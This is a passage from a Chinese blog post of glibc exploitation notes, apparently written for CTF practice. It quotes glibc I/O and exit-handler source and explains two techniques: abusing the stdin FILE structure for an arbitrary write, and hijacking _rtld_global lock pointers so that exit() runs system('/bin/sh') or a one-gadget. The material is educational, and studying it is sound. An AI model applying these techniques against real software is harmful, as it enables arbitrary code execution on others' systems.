class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">	 required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">	 traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">	 not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">	 explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">	  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">	_IO_OVERFLOW (<span class="built_in">stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">	fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">	 handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">	 unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里做了下面几件事</p>
<ol>
<li>判断 <code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code> 是否成立</li>
<li>判断 <code>_flag</code> 是否包括 <code>_IO_NO_READS</code> 这个在宏定义中值为4，所以我们不能包含4</li>
<li>最终调用 <code>_IO_SYSREAD</code> 来进行输出。因此要想利用 <code>stdin</code> 输入缓冲区需设置FILE结构体中 <code>_IO_buf_base</code> 为 <code>write_start</code> ， <code>_IO_buf_end</code>为<code>write_end</code> 。同时也需将结构体中的<code>fp-&gt;_fileno</code>设置为0，最终调用 <code>read (fp-&gt;_fileno, buf, size))</code> 读取数据。</li>
</ol>
<p>所以，为了完成stdin任意地址写，我们要做下面的事情</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置_IO_read_end等于_IO_read_ptr。</span></span><br><span class="line"><span class="comment">#设置_flag &amp;~ _IO_NO_READS即_flag &amp;~ 0x4。</span></span><br><span class="line"><span class="comment">#设置_fileno为0。</span></span><br><span class="line"><span class="comment">#设置_IO_buf_base为write_start，_IO_buf_end为write_end；且使得_IO_buf_end-_IO_buf_base大于fread要读的数据。</span></span><br></pre></td></tr></table></figure>

<h4 id="劫持exit-hook"><a href="#劫持exit-hook" class="headerlink" title="劫持exit_hook"></a>劫持exit_hook</h4><p>严格来说，exit并不存在hook，这是一种类似于指针劫持的方法</p>
<p>我们继续看源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure>

<p>glibc特有的shit堆在shit上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp,</span><br><span class="line">		     <span class="type">bool</span> run_list_atexit, <span class="type">bool</span> run_dtors)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (run_dtors)</span><br><span class="line">      __call_tls_dtors ();</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">     the functions registered with `atexit&#x27; and `on_exit&#x27;. We call</span></span><br><span class="line"><span class="comment">     everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">     exit (). */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (cur == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Exit processing complete.  We will not allow any more</span></span><br><span class="line"><span class="comment">	     atexit/on_exit registrations.  */</span></span><br><span class="line">	  __exit_funcs_done = <span class="literal">true</span>;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">	  <span class="type">const</span> <span class="type">uint64_t</span> new_exitfn_called = __new_exitfn_called;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">	      <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">	      <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">	      <span class="type">void</span> *arg;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">case</span> ef_free:</span><br><span class="line">	    <span class="keyword">case</span> ef_us:</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_on:</span><br><span class="line">	      onfct = f-&gt;func.on.fn;</span><br><span class="line">	      arg = f-&gt;func.on.arg;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">	      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">	      onfct (status, arg);</span><br><span class="line">	      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_at:</span><br><span class="line">	      atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">	      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">	      atfct ();</span><br><span class="line">	      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_cxa:</span><br><span class="line">	      <span class="comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span></span><br><span class="line"><span class="comment">		 we must mark this function as ef_free.  */</span></span><br><span class="line">	      f-&gt;flavor = ef_free;</span><br><span class="line">	      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line">	      arg = f-&gt;func.cxa.arg;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">	      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">	      cxafct (arg, status);</span><br><span class="line">	      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))</span><br><span class="line">	    <span class="comment">/* The last exit function, or another thread, has registered</span></span><br><span class="line"><span class="comment">	       more exit functions.  Start the loop over.  */</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      *listp = cur-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">	<span class="comment">/* Don&#x27;t free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">	   allocate element.  */</span></span><br><span class="line">	<span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">  _exit (status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有一些关键的跳转</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line"><span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line"><span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"><span class="type">void</span> *arg;</span><br></pre></td></tr></table></figure>

<p>跟踪发现，调用dl_fini</p>
<p>源码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line"> again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">	 auditing DSOs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">	  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	  )</span><br><span class="line">	__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现两个关键的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br></pre></td></tr></table></figure>

<p>存在  <strong><em>_rtld_global</em></strong> 结构体</p>
<p>通过gdb <strong>p _rtld_global</strong></p>
<p><img src="/../images/20200413122505426.jpg" alt="在这里插入图片描述"></p>
<p>如上，我们只需要劫持 _rtld_global 结构体中的 <code>__rtld_lock_lock_recursive (GL(dl_load_lock));</code> <code>__rtld_lock_unlock_recursive (GL(dl_load_lock));</code></p>
<p>即可，这里需要调整一下偏移</p>
<h5 id="总结exit调用流程"><a href="#总结exit调用流程" class="headerlink" title="总结exit调用流程"></a>总结exit调用流程</h5><p><code>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive</code></p>
<p>同时，最后的函数在调用前会给rdi赋值，可以直接修改函数为 onegadget或者修改函数和其参数，也就是 <code>rtld_lock_default_unlock_recursive</code> 函数为 <code>system</code> ，并且改把  <code>_rtld_global._dl_load_lock.mutex的值改为 /bin/sh\x00 </code></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/glibcLearning/">glibcLearning</a></div><div class="post_share"><div class="social-share" data-image="/img/default_top_img.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/28/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/" title="静态分析"><img class="cover" src="/img/default_top_img.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">静态分析</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/18/ctfshowWeb/" title="ctfshowWeb"><img class="cover" src="/img/background.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ctfshowWeb</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/09/11/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" title="高版本glibc利用总结"><img class="cover" src="/img/default_top_img.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-11</div><div class="title">高版本glibc利用总结</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">c10uds</div><div class="author-info__description">总有人间一两风，吹我十万八千梦</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/c10uds/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/c10uds" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:asuric10uds@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=2295040368&amp;website=www.oicqzone.com" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Welcome</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#glibc%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0ing"><span class="toc-number">1.</span> <span class="toc-text">glibc总结(持续更新ing)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Heap%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">Heap的基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Heap"><span class="toc-number">1.2.</span> <span class="toc-text">Heap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Chunk"><span class="toc-number">1.3.</span> <span class="toc-text">Chunk</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%93chunk%E8%A2%AB%E9%87%8A%E6%94%BE%E5%90%8E"><span class="toc-number">1.3.1.</span> <span class="toc-text">当chunk被释放后</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bin"><span class="toc-number">1.4.</span> <span class="toc-text">Bin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin"><span class="toc-number">1.4.1.</span> <span class="toc-text">fastbin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsortedbin"><span class="toc-number">1.4.2.</span> <span class="toc-text">unsortedbin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smallbin"><span class="toc-number">1.4.3.</span> <span class="toc-text">smallbin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#largebin"><span class="toc-number">1.4.4.</span> <span class="toc-text">largebin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache"><span class="toc-number">1.4.5.</span> <span class="toc-text">tcache</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-number">1.5.</span> <span class="toc-text">利用手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Use-After-Free-UAF"><span class="toc-number">1.5.1.</span> <span class="toc-text">Use_After_Free(UAF)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Double-free"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">Double_free</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#off-by-one"><span class="toc-number">1.5.2.</span> <span class="toc-text">off_by_one</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unlink"><span class="toc-number">1.5.3.</span> <span class="toc-text">unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-stashing-unlink-attack"><span class="toc-number">1.5.4.</span> <span class="toc-text">tcache_stashing_unlink_attack</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#house-of-lore"><span class="toc-number">1.5.4.1.</span> <span class="toc-text">house of lore:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">1.5.4.2.</span> <span class="toc-text">利用：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-spirit"><span class="toc-number">1.5.5.</span> <span class="toc-text">house of spirit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.5.5.1.</span> <span class="toc-text">利用条件：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-force"><span class="toc-number">1.5.6.</span> <span class="toc-text">house of force</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%EF%BC%9A-1"><span class="toc-number">1.5.6.1.</span> <span class="toc-text">利用条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-number">1.5.6.2.</span> <span class="toc-text">攻击步骤：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-rabbit"><span class="toc-number">1.5.7.</span> <span class="toc-text">house of rabbit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.5.7.1.</span> <span class="toc-text">原理:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.5.7.2.</span> <span class="toc-text">利用条件:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unsortedbin-Attack"><span class="toc-number">1.5.8.</span> <span class="toc-text">Unsortedbin Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#largebin-Attack"><span class="toc-number">1.5.9.</span> <span class="toc-text">largebin Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.5.9.1.</span> <span class="toc-text">原理:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.5.9.2.</span> <span class="toc-text">前提条件:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IO-FILE%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.10.</span> <span class="toc-text">IO_FILE利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FSOP"><span class="toc-number">1.5.10.1.</span> <span class="toc-text">FSOP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E7%89%88%E6%9C%AC%EF%BC%9A"><span class="toc-number">1.5.10.1.1.</span> <span class="toc-text">适用版本：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.5.10.1.2.</span> <span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%EF%BC%9A-2"><span class="toc-number">1.5.10.1.3.</span> <span class="toc-text">利用条件：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-24%E4%B8%8B%E7%9A%84FSOP"><span class="toc-number">1.5.10.2.</span> <span class="toc-text">2.24下的FSOP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#house-of-orange"><span class="toc-number">1.5.10.3.</span> <span class="toc-text">house of orange</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#pre%EF%BC%9Aget-a-freed-chunk"><span class="toc-number">1.5.10.3.1.</span> <span class="toc-text">pre：get a freed chunk</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#FSOP%E9%83%A8%E5%88%86"><span class="toc-number">1.5.10.3.2.</span> <span class="toc-text">FSOP部分</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WP-amp-amp-exp"><span class="toc-number">1.5.10.3.3.</span> <span class="toc-text">WP&amp;&amp;exp</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-IO-2-1-stdout-%E6%B3%84%E9%9C%B2libc"><span class="toc-number">1.5.10.4.</span> <span class="toc-text">利用__IO_2_1_stdout_ 泄露libc</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#flag-%E8%A7%84%E5%88%99"><span class="toc-number">1.5.10.4.1.</span> <span class="toc-text">_flag 规则</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#puts%E5%87%BD%E6%95%B0%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.5.10.4.2.</span> <span class="toc-text">puts函数的执行流程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-IO-2-1-stdin-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">1.5.10.5.</span> <span class="toc-text">利用__IO_2_1_stdin_ 任意地址写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81exit-hook"><span class="toc-number">1.5.10.6.</span> <span class="toc-text">劫持exit_hook</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93exit%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">1.5.10.6.1.</span> <span 